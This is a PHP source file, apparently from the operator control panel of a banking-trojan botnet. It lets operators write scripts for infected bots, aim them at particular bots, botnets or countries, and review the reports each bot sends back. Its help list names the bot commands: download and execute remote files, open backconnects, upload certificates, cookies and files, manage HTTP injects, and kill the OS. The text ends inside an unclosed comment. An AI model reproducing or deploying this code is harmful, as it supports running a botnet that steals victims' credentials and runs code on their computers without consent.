<?php if(!defined('__CP__'))die();
$_allow_edit = !empty($_USER_DATA['r_botnet_scripts_edit']);
define('LIST_ROWS_COUNT', $_allow_edit ? 8 : 7); //Количетсво колонок в списке.
define('SCRIPT_INPUT_TEXT_WIDTH', '600px');      //Ширина edit-боксов для редактирования скрипта.
define('BOTS_PER_PAGE', 50);                     //Количетсво ботов на страницу.
define('BOTSLIST_ROWS_COUNT', 7);                //Количетсво столбцов в  списке ботов.

///////////////////////////////////////////////////////////////////////////////
// Список команд.
///////////////////////////////////////////////////////////////////////////////
if(isset($_GET['help']))
{
  //Все описание команд будут на одном языке, т.к. я не хочу запутаться в языковых модулях.
  $_COMMANDS_LIST = array
  (
    'reboot'   => 'Reboot computer.',
    'kos'      => 'Kill OS.',
    'shutdown' =>  'Shutdown computer.',
  
    'bc_add [service] [ip] [port]' => 'Add backconnect for [service] using server witn address [ip]:[port].',
    'bc_del [service] [ip] [port]' => 'Remove backconnect for [service] (mask is allowed) that use connection to [ip]:[port] (mask is allowed).',
  
    'block_url [url]'   => 'Disable access to [url] (mask is allowed).',
    'unblock_url [url]' => 'Enable access to [url] (mask is allowed).',
  
    'block_fake [url]'   => 'Disable executing of HTTP-fake/inject with mask [url] (mask is allowed).',
    'unblock_fake [url]' => 'Enable executing of HTTP-fake/inject with mask [url] (mask is allowed).',
  
    'rexec [url] [args]'   => 'Download and execute the file [url] with the arguments [args] (optional).',
    'rexeci [url] [args]'  => 'Download and execute the file [url] with the arguments [args] (optional) using interactive user.',
    'lexec [file] [args]'  => 'Execute the local file [file] with the arguments [args] (optional).',
    'lexeci [file] [args]' => 'Execute the local file [file] with the arguments [args] (optional) using interactive user.',
  
    'addsf [file_mask...]' => 'Add file masks [file_mask] for local search.',
    'delsf [file_mask...]' => 'Remove file masks [file_mask] from local search.',
    'getfile [path]'       => 'Upload file or folder [path] to server.',
  
    'getcerts'          => 'Upload certificates from all stores to server.',
    'resetgrab'         => 'Upload to server the information from the protected storage, cookies, etc.',
    'upcfg [url]'       => 'Update configuration file from url [url] (optional, by default used standard url)',
    'rename_bot [name]' => 'Rename bot to [name].',
    'getmff'            => 'Upload Macromedia Flash files to server.',
    'delmff'            => 'Remove Macromedia Flash files.',
    'sethomepage [url]' => 'Set homepage [url] for Internet Explorer.'
  );
  
  $data = '';
  $i = 0;

  foreach($_COMMANDS_LIST as $name => $info)
  {
    $data .=
    THEME_LIST_ROW_BEGIN.
      str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   htmlentities_ex($name)), $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
      str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($info)), $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1).
    THEME_LIST_ROW_END;

    $i++;
  }
  
  $data =
  str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BOTNET_COMMANDS), THEME_LIST_TITLE).
    $data.
  THEME_LIST_END;
  
  ThemeSmall(LNG_BOTNET_COMMANDS, $data, 0, 0, 0);
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Изменение статуса.
///////////////////////////////////////////////////////////////////////////////

if($_allow_edit && isset($_GET['status'], $_GET['enable']) && is_numeric($_GET['status']) && is_numeric($_GET['enable']))
{
  if(!@mysql_query("UPDATE botnet_scripts SET flag_enabled='".($_GET['enable'] ? 1 : 0)."' WHERE id='".addslashes($_GET['status'])."' LIMIT 1"))ThemeMySQLError();

  header('Location: '.QUERY_STRING);
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Дейтсвия над выделеными элементами.
///////////////////////////////////////////////////////////////////////////////

if($_allow_edit && isset($_GET['scriptsaction']) && !empty($_GET['scripts']) && is_array($_GET['scripts']))
{
  //Преврашаем массив в часть запроса.
  $sl = '';
  $count = 0;
  foreach($_GET['scripts'] as $id)if(is_numeric($id))$sl .= ($count++ == 0 ? '' : ' OR ')."id='".addslashes($id)."'";
  
  //Статус.
  if($_GET['scriptsaction'] == 0 || $_GET['scriptsaction'] == 1)
  {
    if(!@mysql_query("UPDATE botnet_scripts SET flag_enabled='".($_GET['scriptsaction'] == 0 ? 1 : 0)."' WHERE {$sl}"))ThemeMySQLError();
  }
  //Сброс.
  else if($_GET['scriptsaction'] == 2)
  {
    if(!($r = @mysql_query("SELECT id, extern_id FROM botnet_scripts WHERE {$sl}")))ThemeMySQLError();
  
    //Обновляем.
    while(($m = @mysql_fetch_row($r)))
    {
      if(@mysql_query("UPDATE botnet_scripts SET extern_id='".addslashes(md5($m[1].CURRENT_TIME, true))."' WHERE id='".addslashes($m[0])."' LIMIT 1"))
      {
        //Удаляем старые отчеты.
        @mysql_query("DELETE FROM botnet_scripts_stat WHERE extern_id='".addslashes($m[1])."'");
      }
    }
  }
  //Удаление.
  else if($_GET['scriptsaction'] == 3)
  {
    //Отключаем все команды.
    if(!@mysql_query("UPDATE botnet_scripts SET flag_enabled='0' WHERE {$sl}"))ThemeMySQLError();
    
    //FIXME: Оптимизировать запросы.
    if(!($r = @mysql_query("SELECT extern_id FROM botnet_scripts WHERE {$sl}")))ThemeMySQLError();
    
    $sl2 = '';
    $count = 0;
    while(($m = @mysql_fetch_row($r)))$sl2 .= ($count++ == 0 ? '' : ' OR ')."extern_id='".addslashes($m[0])."'";
    
    //Удаляем отчеты.
    if(!@mysql_query("DELETE FROM botnet_scripts_stat WHERE {$sl2}"))ThemeMySQLError();
    
    //Удаляем скрипт.
    if(!@mysql_query("DELETE FROM botnet_scripts WHERE {$sl}"))ThemeMySQLError();
  }
  
  header('Location: '.QUERY_STRING);
  die();
}

///////////////////////////////////////////////////////////////////////////////
// Изменение/просмотр скрипта.
///////////////////////////////////////////////////////////////////////////////

if((isset($_GET['view']) && is_numeric($_GET['view'])) || (isset($_GET['new']) && $_allow_edit))
{
  $is_view = isset($_GET['view']) && is_numeric($_GET['view']);  
  $errors = array();

  //Внесение изменений.
  if($_allow_edit && isset($_POST['name'], $_POST['status'], $_POST['limit'], $_POST['bots'], $_POST['botnets'], $_POST['countries'], $_POST['context']))
  {
    if(strlen($_POST['name']) < 1)$errors[] = LNG_BOTNET_SCRIPT_E_NAME;
    if(strlen($_POST['context']) < 1)$errors[] = LNG_BOTNET_SCRIPT_E_CONTEXT;
    
    if(count($errors) == 0)
    {
      //Основные данные.
      $q = "name='".addslashes($_POST['name'])."',".
           "flag_enabled='".($_POST['status'] ? 1 : 0)."',".
           "send_limit='".addslashes(is_numeric($_POST['limit']) ? intval($_POST['limit']) : 0)."',".
           ExpToSQLLists('bots', $_POST['bots']).",".
           ExpToSQLLists('botnets', $_POST['botnets']).",".
           ExpToSQLLists('countries', $_POST['countries']).",".
           "script_text='".addslashes($_POST['context'])."',".
           "script_bin=script_text"; //FIXME: Оптимизация кода.
      
      //Выбор запроса.
      if($is_view)$q = "UPDATE botnet_scripts SET {$q} WHERE id='".addslashes($_GET['view'])."' LIMIT 1";
      else
      {
        $eid = addslashes(md5(CURRENT_TIME.$_POST['context'], true));
        @sleep(2); //Наверное, уменьшает вероятность совпадения ID.
        
        $q = "INSERT INTO botnet_scripts SET {$q}, time_created='".addslashes(CURRENT_TIME)."', extern_id='{$eid}'";
        
        //На всякий случай.
        @mysql_query("DELETE FROM botnet_scripts_stat WHERE extern_id='{$eid}'"); 
      }
      
      if(!@mysql_query($q))ThemeMySQLError();

      header('Location: '.QUERY_STRING); 
      die();
    }
  }
  
  //Получаем данные скрипта.
  if(count($errors) > 0)
  {
    $f_name       = htmlentities_ex($_POST['name']);
    $f_is_enabled = $_POST['status'] > 0 ? true : false;
    $f_limit      = $_POST['limit'];
    $f_bots       = htmlentities_ex($_POST['bots']);
    $f_botnets    = htmlentities_ex($_POST['botnets']);
    $f_countries  = htmlentities_ex($_POST['countries']);
    $f_context    = htmlentities_ex($_POST['context']);
  }
  else if($is_view || $_GET['new'] != -1)
  {
    if(!($r = @mysql_query('SELECT name, flag_enabled, send_limit, bots_wl, bots_bl, botnets_wl, botnets_bl, countries_wl, countries_bl, script_text, extern_id FROM botnet_scripts WHERE id=\''.addslashes($is_view ? $_GET['view'] : $_GET['new']).'\' LIMIT 1')))
    {
      ThemeMySQLError();    
    }
    
    if(!($m = @mysql_fetch_row($r)))ThemeFatalError(LNG_BOTNET_SCRIPT_E1, 0, 0, 0);
    
    $f_name       = htmlentities_ex($m[0]);
    $f_is_enabled = $m[1] > 0 ? true : false;
    $f_limit      = intval($m[2]);
    $f_bots       = htmlentities_ex(SQLListToExp($m[3], $m[4]));
    $f_botnets    = htmlentities_ex(SQLListToExp($m[5], $m[6]));
    $f_countries  = htmlentities_ex(SQLListToExp($m[7], $m[8]));
    $f_context    = htmlentities_ex($m[9]);
    
    if(!$is_view)$f_name = 'Copy of '.$f_name;
  }
  else
  {
    $f_name       = 'script_'.CURRENT_TIME;
    $f_is_enabled = true;
    $f_limit      = 0;
    $f_bots       = isset($_GET['bots']) ? htmlentities_ex($_GET['bots']) : '';
    $f_botnets    = '';
    $f_countries  = '';
    $f_context    = '';
  }
  
  //Вывод формы.
  $data = '';
  
  //Вывод ошибки.
  if(count($errors) > 0)
  {
    $data .= THEME_STRING_FORM_ERROR_1_BEGIN;
    foreach($errors as $r)$data .= $r.THEME_STRING_NEWLINE;
    $data .= THEME_STRING_FORM_ERROR_1_END;
  }
  
  if($_allow_edit)$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('editscript', QUERY_STRING_HTML.'&amp;'.($is_view ? 'view='.htmlentities_ex(urlencode($_GET['view'])) : 'new'), ''), THEME_FORMPOST_BEGIN);
  
  $data .=
  str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, $is_view ? LNG_BOTNET_SCRIPT_EDIT : LNG_BOTNET_SCRIPT_NEW), THEME_DIALOG_TITLE).
    THEME_DIALOG_ROW_BEGIN.
      str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_NAME, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('name', $f_name, 200, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_STATUS, THEME_DIALOG_ITEM_TEXT).
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            str_replace(array('{NAME}', '{WIDTH}'), array('status', 'auto'), $_allow_edit ? THEME_DIALOG_ITEM_LISTBOX_BEGIN : THEME_DIALOG_ITEM_LISTBOX_BEGIN_RO).
              str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_STATUS_DISABLED), !$f_is_enabled ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
              str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_STATUS_ENABLED),  $f_is_enabled  ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM).
            ($_allow_edit ? THEME_DIALOG_ITEM_LISTBOX_END : THEME_DIALOG_ITEM_LISTBOX_END_RO).
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_LIMIT, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('limit', $f_limit, 10, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_BOTS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('bots', $f_bots, 60000, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_BOTNETS, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('botnets', $f_botnets, 60000, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', LNG_BOTNET_SCRIPT_COUNTRIES, THEME_DIALOG_ITEM_TEXT).
          str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('countries', $f_countries, 60000, SCRIPT_INPUT_TEXT_WIDTH), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXT : THEME_DIALOG_ITEM_INPUT_TEXT_RO).
        THEME_DIALOG_ROW_END.
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{TEXT}', str_replace('{URL}', QUERY_STRING_HTML.'&amp;help=1', THEME_STRING_HELP_ANCHOR).' '.LNG_BOTNET_SCRIPT_CONTEXT, THEME_DIALOG_ITEM_TEXT_TOP).
          str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('context', 20, 100, SCRIPT_INPUT_TEXT_WIDTH, $f_context), $_allow_edit ? THEME_DIALOG_ITEM_INPUT_TEXTAREA : THEME_DIALOG_ITEM_INPUT_TEXTAREA_RO).
        THEME_DIALOG_ROW_END.
      THEME_DIALOG_GROUP_END.
    THEME_DIALOG_ROW_END;
  
  if($_allow_edit)  
  {    
    $data .=
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
      str_replace(array('{TEXT}', '{JS_EVENTS}'), array($is_view ? LNG_BOTNET_SCRIPT_ACTION_SAVE : LNG_BOTNET_SCRIPT_ACTION_NEW, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
      ($is_view ? THEME_DIALOG_ITEM_ACTION_SEPARATOR.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_SCRIPT_ACTION_NEWT,
       ' onclick="window.location=\''.QUERY_STRING_HTML.'&amp;new='.htmlentities_ex(urlencode($_GET['view'])).'\'"'), THEME_DIALOG_ITEM_ACTION) : '').
    THEME_DIALOG_ACTIONLIST_END;
  }
  
  $data.=
  THEME_DIALOG_END.($_allow_edit ? THEME_FORMPOST_END : '');
  
  $js_script = 0;
  
  //Вывод списка ботов.  
  if($is_view)
  {
    //JavaScript скрипты.
    $_FULL_QUERY = QUERY_STRING.'&view='.urlencode($_GET['view']);
    $js_sort = addjsslashes($_FULL_QUERY);
    $_FULL_QUERY .= AssocateSortMode(array('rtime', 'type', 'bot_id', 'bot_version', 'report'));
    $js_page = addjsslashes($_FULL_QUERY);
    
    $js_script = JSCheckAll('reportslist', 'checkall', 'bots[]').
                 JSSetSortMode($js_sort).
                 "function ChangePage(p){window.location='{$js_page}&page=' + p; return false;}";

    //Выполняем запрос.
    $cur_page   = (!empty($_GET['page']) && is_numeric($_GET['page']) ? $_GET['page'] : 1);
    $page_count = 0;
    $page_list  = '';
    $bots_count = 0;

    $sortmode = ' ORDER BY '.$_SORT_COLUMN.($_SORT_ORDER == 0 ? ' ASC' : ' DESC');
    if($_SORT_COLUMN_ID != 0)$sortmode .= ', bot_id'.($_SORT_ORDER == 0 ? ' ASC' : ' DESC');

    //Получение обшего кол. элементов.
    $r = @mysql_query('SELECT COUNT(*) FROM botnet_scripts_stat WHERE extern_id=\''.addslashes($m[10]).'\'');
    if(($mt = @mysql_fetch_row($r)))
    {
      //Создание списка страниц.
      if(($page_count = ceil($mt[0] / BOTS_PER_PAGE)) > 1)
      {
        $page_list = 
        THEME_DIALOG_ROW_BEGIN.
          str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
            ShowPageList($page_count, $cur_page, 'return ChangePage({P})').
          THEME_DIALOG_ITEM_CHILD_END.
        THEME_DIALOG_ROW_END;
      }
      $bots_count = $mt[0];
    }
    
    //Получение списка элементов.
    $offset = (($cur_page - 1) * BOTS_PER_PAGE);
    $blist = '';
    if(!$r ||
       !($r = @mysql_query("SELECT type, bot_id, bot_version, rtime, report FROM botnet_scripts_stat WHERE extern_id='".addslashes($m[10])."' {$sortmode} LIMIT {$offset}, ".BOTS_PER_PAGE)) ||
       @mysql_affected_rows() === 0)
    {
      $blist =
      THEME_LIST_ROW_BEGIN.
        str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_REPORTS_EMPTY : mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).
      THEME_LIST_ROW_END;
    }
    else
    {
      $i = 0;
      while(($mt = @mysql_fetch_row($r)))
      {
        $theme_text = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2            : THEME_LIST_ITEM_LTEXT_U1;
        $theme_num  = $i % 2 ? THEME_LIST_ITEM_RTEXT_U2            : THEME_LIST_ITEM_RTEXT_U1;
        $theme_cb   = $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1;
      
        $status = ($mt[0] == 1 ? LNG_BOTNET_REPORTS_SSENDED : ($mt[0] == 2 ? LNG_BOTNET_REPORTS_SREADY : LNG_BOTNET_REPORTS_SERROR));
        
        $blist .=
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlentities_ex($mt[1]), ''),                             $theme_cb).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int(++$offset)),                                          $theme_num).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $mt[3]))),                           $theme_num).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $status),                                                                  $theme_text).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', BotPopupMenu($mt[1], 'botmenu')),                                          $theme_text).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', IntToVersion($mt[2])),                                                     $theme_num).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex($mt[4])),                                                  $theme_text).
        THEME_LIST_ROW_END;  
    
        $i++;
      }
    }
    
    //Создание списока дейтвий.
    $actions = '';
    if($bots_count > 0 && count($_BOT_MENU) > 0)
    {
      $actions = LNG_BOTNET_BOTSACTION.'&#160;'.str_replace(array('{NAME}', '{WIDTH}'), array('botsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN);
      foreach($_BOT_MENU as $item)$actions .= str_replace(array('{VALUE}', '{TEXT}'), array($item[0], $item[1]), THEME_DIALOG_ITEM_LISTBOX_ITEM);
      $actions .= THEME_DIALOG_ITEM_LISTBOX_END.'&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT);
      $actions = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $actions, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
    }

    //Вывод таблицы.
    $data .=
    THEME_VSPACE.
    str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('reportslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN).
    str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, sprintf(LNG_BOTNET_REPORTS, number_format_as_int($bots_count))), THEME_DIALOG_TITLE).
      $page_list.
      $actions.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
          str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN).
            THEME_LIST_ROW_BEGIN.
              str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="CheckAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1).
              str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '#', 'auto'),                                                              THEME_LIST_HEADER_R).
              WriteSortColumn(LNG_BOTNET_REPORTS_RTIME,   0, 1).
              WriteSortColumn(LNG_BOTNET_REPORTS_TYPE,    1, 0).
              WriteSortColumn(LNG_BOTNET_REPORTS_BOTID,   2, 0).
              WriteSortColumn(LNG_BOTNET_REPORTS_VERSION, 3, 1).
              WriteSortColumn(LNG_BOTNET_REPORTS_REPORT,  4, 0).
            THEME_LIST_ROW_END.
            $blist.
          THEME_LIST_END.
        THEME_DIALOG_ITEM_CHILD_END.
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_END.
    THEME_FORMGET_END;
  }
  
  ThemeSmall($is_view ? LNG_BOTNET_SCRIPT_EDIT : LNG_BOTNET_SCRIPT_NEW, $data, $js_script, GetBotJSMenu('botmenu'), 0);
  die();
}

///////////////////////////////////////////////////////////////////////////////
// JavaScript скрипты.
///////////////////////////////////////////////////////////////////////////////

$js_script = 0;
if($_allow_edit)
{
  $js_qa     = addjsslashes(LNG_BOTNET_LIST_ACTION_Q);
  $js_script = JSCheckAll('scriptslist', 'checkall', 'scripts[]').
              "function ExecuteAction(){return confirm('{$js_qa}');}";
}

///////////////////////////////////////////////////////////////////////////////
// Создание списка команд.
///////////////////////////////////////////////////////////////////////////////

$list = '';
if(!($r = @mysql_query('SELECT id, extern_id, name, flag_enabled, send_limit, time_created FROM botnet_scripts ORDER BY time_created ASC')) || @mysql_affected_rows() === 0)
{
  $list .=
  THEME_LIST_ROW_BEGIN.
    str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(LIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).
  THEME_LIST_ROW_END;
}
else
{
  $i = 0;
  while(($mt = @mysql_fetch_row($r)))
  {
    if(!($rx = @mysql_query("SELECT SUM(IF(type=1, 1, 0)), SUM(IF(type=2, 1, 0)), SUM(IF(type>2, 1, 0)) FROM botnet_scripts_stat WHERE extern_id='".addslashes($mt[1])."'")))
    {
      $list .= THEME_LIST_ROW_BEGIN.str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(LIST_ROWS_COUNT, mysql_error_ex()), THEME_LIST_ITEM_EMPTY_1).THEME_LIST_ROW_END;
    }
    else
    {
      $mx = @mysql_fetch_row($rx);
      $theme_text = $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1;
      $theme_num  = $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1;
    
      $url_edit = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;view='.$mt[0], strlen($mt[2]) > 0 ? htmlentities_ex($mt[2]) : '-'), THEME_LIST_ANCHOR);
      
      $url_status = $mt[3] > 0 ? LNG_BOTNET_STATUS_ENABLED : LNG_BOTNET_STATUS_DISABLED;
      if($_allow_edit)$url_status = str_replace(array('{URL}', '{TEXT}'), array(QUERY_STRING_HTML.'&amp;status='.$mt[0].'&amp;enable='.($mt[3] > 0 ? 0 : 1), $url_status), THEME_LIST_ANCHOR);
      
      $list .= THEME_LIST_ROW_BEGIN;
      if($_allow_edit)$list .= str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('scripts[]', $mt[0], ''), $i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1);
    
      $list .=
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $url_edit),                                        $theme_text).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $url_status),                                      $theme_text).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlentities_ex(gmdate(LNG_FORMAT_DT, $mt[5]))),   $theme_num).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int($mt[4])),                     $theme_num).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int(isset($mx[0]) ? $mx[0] : 0)), $theme_num).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int(isset($mx[1]) ? $mx[1] : 0)), $theme_num).
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', number_format_as_int(isset($mx[2]) ? $mx[2] : 0)), $theme_num).
      THEME_LIST_ROW_END;  
    
      $i++;
    }
  }
}

///////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////

//Список действий.
$al = '';
if($_allow_edit)
{
  $al = 
  LNG_BOTNET_LIST_ACTION.'&#160;'.
  str_replace(array('{NAME}', '{WIDTH}'), array('scriptsaction', 'auto'), THEME_DIALOG_ITEM_LISTBOX_BEGIN).
    str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_LIST_ACTION_ENABLE),  THEME_DIALOG_ITEM_LISTBOX_ITEM).
    str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_LIST_ACTION_DISABLE), THEME_DIALOG_ITEM_LISTBOX_ITEM).
    str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_LIST_ACTION_RESET),   THEME_DIALOG_ITEM_LISTBOX_ITEM).
    str_replace(array('{VALUE}', '{TEXT}'), array(3, LNG_BOTNET_LIST_ACTION_REMOVE),  THEME_DIALOG_ITEM_LISTBOX_ITEM).
  THEME_DIALOG_ITEM_LISTBOX_END.
  '&#160;'.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_ACTION_APPLY, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ITEM_ACTION_SEPARATOR.str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BOTNET_LIST_ACTION_ADD, ' onclick="window.location=\''.QUERY_STRING_HTML.'&amp;new=-1\'"'), THEME_DIALOG_ITEM_ACTION).
  THEME_STRING_NEWLINE.THEME_STRING_NEWLINE;
  
  $al = THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', $al, THEME_DIALOG_ITEM_TEXT).THEME_DIALOG_ROW_END;
}

//Вывод.
ThemeBegin(LNG_BOTNET, $js_script, 0, 0);
if($_allow_edit)echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('scriptslist', QUERY_SCRIPT_HTML, ' onsubmit="return ExecuteAction()"'), THEME_FORMGET_BEGIN).FORM_CURRENT_MODULE;

echo
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_BOTNET_LIST_TITLE), THEME_DIALOG_TITLE).
  $al.
  THEME_DIALOG_ROW_BEGIN.
     str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN).
      str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN).
        THEME_LIST_ROW_BEGIN;

if($_allow_edit)
{
  echo    str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="CheckAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1);
}

echo      str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_NAME,     'auto'), THEME_LIST_HEADER_L).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_STATUS,   'auto'), THEME_LIST_HEADER_L).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_CTIME,    'auto'), THEME_LIST_HEADER_R).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_LIMIT,    'auto'), THEME_LIST_HEADER_R).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_SENDED,   'auto'), THEME_LIST_HEADER_R).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_EXECUTED, 'auto'), THEME_LIST_HEADER_R).
          str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, LNG_BOTNET_LIST_ERRORS,   'auto'), THEME_LIST_HEADER_R).
        THEME_LIST_ROW_END.
        $list.
      THEME_LIST_END.
    THEME_DIALOG_ITEM_CHILD_END.
  THEME_DIALOG_ROW_END.
THEME_DIALOG_END;

if($_allow_edit)echo THEME_FORMGET_END;
ThemeEnd();

die();

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
